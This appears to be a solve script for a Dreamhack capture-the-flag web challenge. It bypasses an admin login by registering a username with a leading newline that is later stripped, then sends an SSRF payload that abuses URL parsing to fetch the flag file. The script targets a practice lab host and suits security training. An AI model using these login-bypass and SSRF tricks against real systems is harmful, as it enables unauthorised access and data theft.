import requests
import re

url = 'http://host3.dreamhack.games:21331/'
s = requests.Session()

# admin login
creds = {
    'username': '\nadmin',
    'password': 'a'
}

res = s.post(f'{url}/signup', data=creds)

creds['username'] = creds['username'].strip()

res = s.post(f'{url}/login', data=creds)

assert 'admin page' in res.text.lower()
print("> Logged in")

# ssrf
payload = 'http@0/dreamhack.io/{.}./flag?a'

res = s.post(f'{url}/admin', data={
    'url': payload
})

flag = re.findall(r'(DH{.+?})', res.text)[0].strip()
print("Flag:", flag)